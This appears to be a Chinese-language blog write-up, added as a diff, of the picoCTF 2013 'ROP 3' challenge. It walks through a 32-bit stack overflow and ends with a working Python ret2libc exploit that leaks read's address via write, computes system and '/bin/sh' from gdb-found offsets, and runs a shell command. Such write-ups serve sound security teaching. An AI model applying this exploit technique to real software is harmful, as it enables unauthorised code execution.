@@ -1,0 +1,119 @@
+---
+layout: post
+title: ROP 3
+categories: writeups
+tags: pwn
+ctfsite: picoctf-2013
+challenge_url: https://github.com/picoCTF/picoCTF-2013-problems/tree/master/ROP%203
+---
+
+这是 [ROP 2]({% url_by_slug picoctf-2013-rop-2 %}) 的进阶版。程序不再导入 `system` 函数，也没有现成的 "/bin/sh" 字符串了：
+
+```c
+#undef _FORTIFY_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void vulnerable_function()  {
+	char buf[128];
+	read(STDIN_FILENO, buf,256);
+}
+
+void be_nice_to_people() {
+	// /bin/sh is usually symlinked to bash, which usually drops privs. Make
+	// sure we don't drop privs if we exec bash, (ie if we call system()).
+	gid_t gid = getegid();
+	setresgid(gid, gid, gid);
+}
+
+int main(int argc, char** argv) {
+    be_nice_to_people();
+	vulnerable_function();
+	write(STDOUT_FILENO, "Hello, World\n", 13);
+}
+```
+
+{% include writeup_begin.html %}
+
+目前，绝大多数系统都有 ASLR（地址空间随机化）机制。在 ASLR 开启的情况下，动态库、栈空间的地址每次执行都会随机变化，这让确定栈上的缓冲区地址、确定动态库中的函数地址更加困难。对于可执行程序来说，如果编译时使用了 `-pie` 编译选项（生成位置无关的可执行程序），则在执行这个程序时，它的加载地址也会随机化；如果指定了 `-no-pie` 选项，则每次加载的地址都是固定的。我们可以通过 `file` 命令来查看一个可执行文件中的代码是否是位置无关的：
+
+```bash
+dontpanic@Ubuntu:~$ gcc -no-pie test.c
+dontpanic@Ubuntu:~$ file a.out
+a.out: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b6a30608d5278aba091e7f52f2a7fd25e7c745a9, not stripped
+dontpanic@Ubuntu:~$
+dontpanic@Ubuntu:~$
+dontpanic@Ubuntu:~$ gcc -pie test.c
+dontpanic@Ubuntu:~$ file a.out
+a.out: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75017e995c8e398060095542ea11b2bb1445a965, not stripped
+dontpanic@Ubuntu:~$
+```
+
+rop3 程序采用了 `-no-pie`，这为我们的爆破带来了便利。
+
+程序的导入表中存放有导入函数的真实地址，这些地址每次运行都会不同——这是因为在每一次程序执行时，动态库都会加载在不同的地址上。然而，虽然每一次动态库的加载地址不同，但同一动态库内部的函数之间的相对地址仍然不变，我们可以根据已导入的函数的真实地址来计算得出目标函数的真实地址。
+
+这道题目的程序导入了 `read` 和 `write`，这让我们有机会通过 `write` 打印出它们的真实地址，从而能够计算出 `system` 函数的真实地址。这三个函数都是 `libc` 中的函数，因此它们相互之间的相对距离是不变的：
+
+![libc]({% asset libc.png %})
+
+我们选择 `read` 函数的地址作为基准。首先，我们需要通过溢出覆盖掉返回地址，从而能够调用 `write` 函数打印出 `read` 函数的真实地址，然后通过构造栈上的内容，让 `write` 函数再次返回至 `vulnerable_function`，以便我们再次覆盖返回地址调用 `system` 函数。`system` 函数的地址通过 `read` 函数的地址计算而得。
+
+首先我们需要计算一下 `system` 和 `read` 函数之间的偏移。使用 gdb 调试一下：
+
+```
+(gdb) info address system
+Symbol "system" is at 0xf7e25200 in a file compiled without debugging.
+(gdb) info address read
+Symbol "read" is at 0xf7ececb0 in a file compiled without debugging.
+```
+
+因此 `system` 的地址就等于 `read + (0xf7e25200 - 0xf7ececb0)`。下面我们有一个问题没有解决：`/bin/sh` 字符串要怎么搞？这里有几种不同方法：一是可以使用 gdb 在内存中搜索一下，看看内存中是否会有现成的字符串，有时候某些指令可能会碰巧组合成我们需要的字符串；二是我们可以自行找一块可写的内存把这一段字符串写入——我们有 `read` 方法可以从 `stdin` 读入字符串，而后写入到指定的地址中。
+
+libc 中刚好存在 `/bin/sh` ——首先在 gdb 中使用 `info proc` 查看一下进程 id，然后通过 `cat /proc/PID/maps` 查看一下内存映射情况：
+
+```
+f7de8000-f7fbd000 r-xp 00000000 08:01 258140                             /lib/i386-linux-gnu/libc-2.27.so
+f7fbd000-f7fbe000 ---p 001d5000 08:01 258140                             /lib/i386-linux-gnu/libc-2.27.so
+f7fbe000-f7fc0000 r--p 001d5000 08:01 258140                             /lib/i386-linux-gnu/libc-2.27.so
+f7fc0000-f7fc1000 rw-p 001d7000 08:01 258140                             /lib/i386-linux-gnu/libc-2.27.so
+```
+
+然后在 gdb 中查找一下 `/bin/sh`：
+
+```
+(gdb) find 0xf7de8000,0xf7fbd000,"/bin/sh"
+0xf7f660cf
+1 pattern found.
+```
+
+因此，`/bin/sh` 的地址即为 `read_addr + (0xf7f660cf - 0xf7ececb0)`。
+
+下面我们就要正式开始进行爆破了。由于我们需要两次溢出，第二次溢出填入的内容需要根据第一次溢出的输出而改变，因此我们需要 python 的一点帮助：
+
+```python
+import subprocess as sp
+
+p = sp.Popen("./rop3-7f3312fe43c46d26", stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE, bufsize=1)
+
+#                                               ↓write函数结束后的返回地址              ↓write的第二个参数
+p.stdin.write('0' * 0x88 + '0000\xa0\x83\x04\x08\x74\x84\x04\x08\x01\x00\x00\x00\x00\xa0\x04\x08\x04\x00\x00\x00\n')
+#                          ↑ebp ↑write的地址                      ↑write的第一个参数                ↑write的第三个参数
+s = p.stdout.read(4)[::-1]
+read_addr = int(s.encode('hex'), 16)
+system_addr = read_addr + (0xf7e25200 - 0xf7ececb0)
+system_s = format(system_addr, 'x').decode('hex')[::-1]
+str_addr = read_addr + (0xf7f660cf - 0xf7ececb0)
+str_s = format(str_addr, 'x').decode('hex')[::-1]
+
+#                                              ↓system结束后的返回地址
+p.stdin.write('0' * 0x88 + '0000' + system_s + '0000' + str_s + '0' * (256-0x88-16) + 'whoami\n')
+#                          ↑ebp    ↑system的地址        ↑system的参数                   ↑想要执行的命令
+
+# 将会打印出 whoami 的执行结果
+print p.stdout.readline()
+
+```
+
+{% include writeup_end.html %}
